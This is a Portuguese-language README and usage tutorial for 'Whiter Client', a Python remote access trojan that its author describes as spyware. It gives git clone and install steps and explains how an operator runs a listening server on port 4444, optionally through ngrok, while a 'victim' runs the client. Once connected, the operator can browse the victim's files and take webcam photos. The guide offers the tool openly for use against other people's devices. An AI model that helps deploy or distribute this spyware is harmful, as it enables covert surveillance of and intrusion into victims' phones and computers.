

# Whiter Client V0.1

By Dragonmodder (Jhon)

Whiter Client é uma ferramenta de administração remota (RAT) e também um spyware, desenvolvida em Python puro. 

Recursos principais:

Conexão remota cliente/servidor via socket

Execução de comandos no terminal da máquina alvo

Captura de imagem da webcam remotamente

Interface leve e direta em modo texto

Compatível com Windows, Linux e Android (via Termux)


Observações:

Caso usar para o mau, eu não me responsabilizo por qualquer dado em telemóveis ou computadores de outras pessoas. 

Instalação

No Android (Termux):

pkg update && pkg install git python -y
git clone https://github.com/Dragonmodder7/Whiter-Client.git
cd Whiter-Client
python client.py

No Linux:

sudo apt update && sudo apt install git python -y
git clone https://github.com/Dragonmodder7/Whiter-Client.git
cd Whiter-Client
python client.py

Usando o Whiter client - Tutorial 

Entendendo os arquivos

server.py: você roda esse no seu celular ou PC, ele que vai controlar tudo.

client.py: esse é o que a vítima tem que rodar, ele se conecta ao seu servidor.


Iniciando o servidor

No seu aparelho (que vai comandar), roda:

python server.py

Ele vai pedir um IP e uma porta. Se for tudo local, coloca:

HOST: 0.0.0.0
PORTA: 4444

Se quiser usar remotamente, você precisa do seu IP público ou usar algo como o ngrok.


Conectando a vítima

Na máquina da vítima (onde você quer ter o acesso), a pessoa precisa rodar:

python client.py

E colocar o IP e a porta do seu servidor, exemplo:

IP do servidor: 192.168.0.100
PORTA: 4444

Assim que ela conectar, no seu terminal vai aparecer a conexão ativa.


Comandos que você pode usar

Depois que a conexão estiver feita, você pode digitar comandos como:

ls: lista os arquivos da vítima

cd nome_da_pasta: muda de pasta

webcam_snap: tira uma foto da webcam

exit: encerra a conexão
